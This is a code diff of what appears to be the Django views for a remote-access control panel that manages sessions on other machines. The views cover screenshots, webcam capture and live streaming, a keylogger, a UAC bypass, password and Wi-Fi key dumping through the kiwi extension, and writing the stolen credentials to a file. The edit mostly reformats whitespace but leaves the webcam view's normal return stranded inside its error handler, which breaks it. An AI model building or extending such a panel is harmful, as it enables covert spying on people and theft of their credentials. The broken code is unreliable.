@@ -65,7 +65,7 @@ def jobs(request):
 	        jobs = toolbox.get_jobs()
         except httplib.CannotSendRequest:
 		return render(request, 'server/error.html')
-	
+
 	return render(request, 'server/jobs.html', {'jobs': jobs, 'jobs_nbr': len(jobs)})
 
 
@@ -86,7 +86,7 @@ def home(request):
 		        _payload_exists = payload_exists()
                 except httplib.CannotSendRequest:
 		        return render(request, 'server/error.html')
-	
+
 
 
 	return render(request, 'server/home.html', {'flag': flag, 'sessions': sessions, 'sessions_nbr': len(sessions), 'jobs': jobs, 'jobs_nbr': len(jobs), 'payload_exists': _payload_exists})
@@ -107,7 +107,7 @@ def sessions(request):
 	        sessions = toolbox.get_sessions()
         except httplib.CannotSendRequest:
 		return render(request, 'server/error.html')
-	
+
 	return render(request, 'server/sessions.html', {'sessions': sessions, 'sessions_nbr': len(sessions)})
 
 
@@ -131,7 +131,7 @@ def session_close(request, id):
 	        toolbox.session_close(int(id))
         except httplib.CannotSendRequest:
 		return render(request, 'server/error.html')
-	
+
 	return redirect('sessions')
 
 
@@ -140,7 +140,7 @@ def action_screenshot(request, id):
 	        toolbox.post_take_screenshot(session=int(id))
         except httplib.CannotSendRequest:
 		return render(request, 'server/error.html')
-	
+
 	return redirect(session_screenshot, id)
 
 
@@ -149,7 +149,7 @@ def session_screenshot(request, id):
 	        images = toolbox.get_screenshots_url(session=int(id))
         except httplib.CannotSendRequest:
                 return render(request, 'server/error.html')
-	
+
 	return render(request, 'server/session_screenshot.html', {'id': int(id), 'images': images, 'len_images': len(images)})
 
 
@@ -165,36 +165,42 @@ def action_webcam(request, id):
 
 
 def session_webcam(request, id):
-        try:
-	        has_webcam = toolbox.has_webcam(session=int(id))
-	        images = toolbox.get_snapshots_url(session=int(id))
-        except httplib.CannotSendRequest:
+	try:
+		has_webcam = toolbox.has_webcam(session=int(id))
+		images = toolbox.get_snapshots_url(session=int(id))
+	except httplib.CannotSendRequest:
 		return render(request, 'server/error.html')
-	
-	return render(request, 'server/session_webcam.html', {'id': int(id), 'has_webcam': has_webcam, 'images': images})
+
+		return render(request, 'server/session_webcam.html', {'id': int(id), 'has_webcam': has_webcam, 'images': images})
 
 
 def session_live(request, id):
-        try:
-	        has_webcam = toolbox.has_webcam(session=int(id))
-	        enabled = toolbox.get_streaming_flag()
-	        live_url = toolbox.get_live_url()
-        except httplib.CannotSendRequest:
-                return render(request, 'server/error.html')
+	try:
+		has_webcam = toolbox.has_webcam(session=int(id))
+		enabled = False #toolbox.get_streaming_flag()
+		live_url = toolbox.get_live_url()
+	except httplib.CannotSendRequest:
+		return render(request, 'server/error.html')
 
 	if request.GET.get('action') == 'start':
-                try:
-		        toolbox.start_live(int(id))
-                        enabled = toolbox.get_streaming_flag()
-                except httplib.CannotSendRequest:
-		        return render(request, 'server/error.html')
+		try:
+			toolbox.start_live(int(id))
+			enabled = True
+		except httplib.CannotSendRequest:
+			return render(request, 'server/error.html')
+	elif request.GET.get('action') == 'stop':
+		try:
+			toolbox.stop_live(int(id))
+			enabled = False
+		except httplib.CannotSendRequest:
+			return render(request, 'server/error.html')
 	elif request.GET.get('action') == 'update':
-                try:
-                        toolbox.live_update_frame(int(id))
-		        enabled = toolbox.get_streaming_flag()
-                        return JsonResponse({'value': enabled})
-                except httplib.CannotSendRequest:
-		        return JsonResponse({'value': True})
+		try:
+			toolbox.live_update_frame(int(id))
+			enabled = True
+			return JsonResponse({'value': enabled})
+		except httplib.CannotSendRequest:
+			return JsonResponse({'value': True})
 
 	return render(request, 'server/session_live.html', {'id': int(id), 'has_webcam': has_webcam, 'enabled': enabled, 'live_url': live_url})
 
@@ -204,7 +210,7 @@ def session_explorer(request, id):
 	        shell = toolbox.get_session_shell(int(id))
         except httplib.CannotSendRequest:
 		return render(request, 'server/error.html')
-	
+
 
 	path = request.GET.get('path')
 	ftype = request.GET.get('type')
@@ -279,7 +285,7 @@ def session_keylogger(request, id):
 	except SessionTimedOutException:
 		return render(request, 'server/session_lost.html', {'id': int(id)})
 	except httplib.CannotSendRequest:
-		return render(request, 'server/error.html')	
+		return render(request, 'server/error.html')
 
 	return render(request, 'server/session_keylogger.html', {'id': int(id), 'enabled': enabled})
 
@@ -298,7 +304,7 @@ def remote(request):
 		        return render(request, 'server/remote_state.html', {'enabled': toolbox.get_remote_state()})
         except httplib.CannotSendRequest:
 		return render(request, 'server/error.html')
-	
+
 
 	return render(request, 'server/remote.html', {'enabled': toolbox.get_remote_state()})
 
@@ -315,7 +321,7 @@ def session_getadmin(request, id):
 	        toolbox.start_bypassuac(id)
         except httplib.CannotSendRequest:
                 return render(request, 'server/error.html')
-        
+
 	return JsonResponse({'value': True})
 
 
@@ -338,7 +344,7 @@ def session_wifi_list(request, id):
                 is_admin, is_system = load_kiwi_extension(id)
         except httplib.CannotSendRequest:
                 return render(request, 'server/error.html')
-	
+
 	return render(request, 'server/session_wifi_list.html', {'id': int(id), 'is_admin': is_admin, 'is_system': is_system })
 
 
@@ -347,7 +353,7 @@ def session_passwords(request, id):
 	        is_admin, is_system = load_kiwi_extension(id)
         except httplib.CannotSendRequest:
 		return render(request, 'server/error.html')
-	
+
 	return render(request, 'server/session_passwords.html', {'id': int(id), 'is_admin': is_admin, 'is_system': is_system })
 
 def session_passwords_async(request, id):
@@ -362,7 +368,7 @@ def session_passwords_async(request, id):
 		fd = open(creds_file, "w+")
 		fd.write(ret)
 		fd.close()
-		
+
 	return JsonResponse({'value': ret})
 
 def session_wifi_list_async(request, id):
